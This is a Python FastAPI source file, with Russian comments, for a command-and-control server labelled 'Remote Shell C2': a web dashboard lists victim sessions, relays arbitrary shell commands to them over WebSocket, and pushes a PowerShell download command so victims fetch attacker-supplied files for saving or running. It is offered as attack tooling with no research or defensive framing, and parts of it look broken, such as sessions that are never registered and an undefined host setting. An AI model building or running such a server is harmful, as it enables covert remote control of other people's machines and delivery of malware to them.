import os
import uuid
import asyncio
from fastapi import FastAPI, WebSocket, UploadFile, File, Form, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
from typing import Dict, Any

app = FastAPI()

# Хранилище сессий: {session_id: {"ws": websocket, "cmd_history": []}}
sessions: Dict[str, dict] = {}

# Папка для временного хранения файлов перед отправкой жертве
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class Command(BaseModel):
    session_id: str
    command: str

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    # Простой интерфейс для управления
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Dashboard</title>
        <style>
            body { background: #1e1e1e; color: #0f0; font-family: monospace; padding: 20px; }
            .container { display: flex; gap: 20px; height: 90vh; }
            #sessions { width: 20%; border-right: 1px solid #333; overflow-y: auto; }
            .sess-btn { display: block; width: 100%; margin-bottom: 5px; padding: 10px; cursor: pointer; background: #333; color: white; border: none; text-align: left; }
            .sess-btn.active { background: #006400; }
            #console { width: 70%; background: #000; padding: 10px; overflow-y: scroll; border: 1px solid #333; }
            #input-area { width: 100%; display: flex; gap: 10px; margin-top: 10px; }
            input[type="text"] { flex-grow: 1; background: #111; color: white; border: 1px solid #555; padding: 10px; }
            button { padding: 10px 20px; cursor: pointer; }
            .log-line { margin: 2px 0; word-break: break-all; }
            .error { color: red; }
            .success { color: cyan; }
        </style>
    </head>
    <body>
        <h2>Remote Shell C2</h2>
        <div class="container">
            <div id="sessions">
                <h3>Active Sessions</h3>
                <!-- Список сессий генерируется JS -->
            </div>
            <div style="width: 80%; display: flex; flex-direction: column;">
                <div id="console"></div>
                <div id="input-area">
                    <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCmd()">
                    <button onclick="sendCmd()">Send CMD</button>
                    <input type="file" id="fileInput" onchange="uploadFile()">
                    <button onclick="document.getElementById('fileInput').click()">Upload File to Victim</button>
                </div>
            </div>
        </div>
        <script>
            let currentSessionId = null;
            let ws = null;

            function log(msg, type = 'info') {
                const c = document.getElementById('console');
                const d = document.createElement('div');
                d.className = 'log-line ' + type;
                d.innerText = msg;
                c.appendChild(d);
                c.scrollTop = c.scrollHeight;
            }

            // Подключение к WebSocket
            function connectWS(sessionId) {
                if (ws) ws.close();
                const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
                ws = new WebSocket(`${protocol}://${window.location.host}/ws/${sessionId}`);
                
                ws.onopen = () => {
                    log(`Connected to ${sessionId}`, 'success');
                    updateButtons();
                };
                ws.onmessage = (event) => {
                    log(event.data);
                };
                ws.onclose = () => {
                    log(`Disconnected from ${sessionId}`, 'error');
                    updateButtons();
                };
                ws.onerror = (err) => console.error(err);
            }

            function sendCmd() {
                const cmd = document.getElementById('cmdInput').value;
                if (!cmd || !currentSessionId) return;
                fetch('/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: currentSessionId, command: cmd})
                });
                document.getElementById('cmdInput').value = '';
            }

            async function uploadFile() {
                const fileInput = document.getElementById('fileInput');
                const file = fileInput.files[0];
                if (!file || !currentSessionId) return;

                const formData = new FormData();
                formData.append('file', file);
                
                try {
                    const res = await fetch(`/upload/${currentSessionId}`, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await res.json();
                    log(data.message || data.detail, data.ok ? 'success' : 'error');
                } catch (e) {
                    log('Upload failed: ' + e.message, 'error');
                }
            }

            function updateButtons() {
                const btns = document.querySelectorAll('.sess-btn');
                btns.forEach(b => b.classList.remove('active'));
                if (currentSessionId && ws && ws.readyState === WebSocket.OPEN) {
                    const activeBtn = document.querySelector(`.sess-btn[data-id="${currentSessionId}"]`);
                    if (activeBtn) activeBtn.classList.add('active');
                }
            }

            // Инициализация списка сессий при загрузке
            fetch('/sessions')
                .then(r => r.json())
                .then(sessions => {
                    const container = document.getElementById('sessions');
                    sessions.forEach(id => {
                        const btn = document.createElement('button');
                        btn.className = 'sess-btn';
                        btn.dataset.id = id;
                        btn.innerText = `ID: ${id.slice(0,8)}...`;
                        btn.onclick = () => {
                            currentSessionId = id;
                            connectWS(id);
                        };
                        container.appendChild(btn);
                    });
                });
        </script>
    </body>
    </html>
    """

@app.websocket("/ws/{session_id}")
async def websocket_endpoint(websocket: WebSocket, session_id: str):
    await websocket.accept()
    sessions[session_id]["ws"] = websocket
    try:
        while True:
            # Ждем сообщения от клиента (если нужно двустороннее общение в будущем)
            data = await websocket.receive_text()
            # Логика обработки входящих данных от жертвы
    except Exception:
        pass
    finally:
        if session_id in sessions:
            del sessions[session_id]

@app.post("/cmd")
async def execute_command(cmd_data: Command):
    session_id = cmd_data.session_id
    if session_id not in sessions:
        return {"status": "error", "message": "Session not found"}
    
    # Отправляем команду жертве через WebSocket
    ws = sessions[session_id].get("ws")
    if ws:
        await ws.send_text(f"CMD:{cmd_data.command}")
        return {"status": "ok"}
    return {"status": "error", "message": "Connection lost"}

@app.post("/upload/{session_id}")
async def upload_file_to_victim(session_id: str, file: UploadFile = File(...)):
    if session_id not in sessions:
        return {"status": "error", "message": "Session not found"}
    
    # Сохраняем файл локально на сервере
    file_path = os.path.join(UPLOAD_DIR, file.filename)
    with open(file_path, "wb") as buffer:
        buffer.write(await file.read())
        
    # Отправляем путь к файлу жертве (она должна будет его забрать или выполнить)
    # В данной реализации мы просто сообщаем жертве, что файл доступен по пути
    # Или можно отправить сам бинарник через websocket, но это тяжелее.
    # Здесь мы скажем жертве скачать его с нашего сайта или передадим бинарник напрямую.
    # Для простоты: жертва получит команду скачать файл с нашего статического сервера.
    
    download_url = f"http://{app.state.app_host or 'localhost'}:8000/files/{file.filename}"
    
    ws = sessions[session_id].get("ws")
    if ws:
        # Команда для жертвы: скачать файл и запустить/сохранить
        cmd = f"powershell -c Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP%\\{file.filename}'"
        await ws.send_text(f"FILE_CMD:{cmd}")
        return {"status": "ok", "message": f"Command sent to download {file.filename}"}
    
    return {"status": "error", "message": "Connection lost"}

@app.get("/sessions")
async def get_sessions():
    return list(sessions.keys())

if __name__ == "__main__":
    import uvicorn
    # Укажите хост и порт, к которому будет подключаться жертва
    # Если жертва в другой сети, нужен публичный IP или туннель
    uvicorn.run(app, host="0.0.0.0", port=8000)
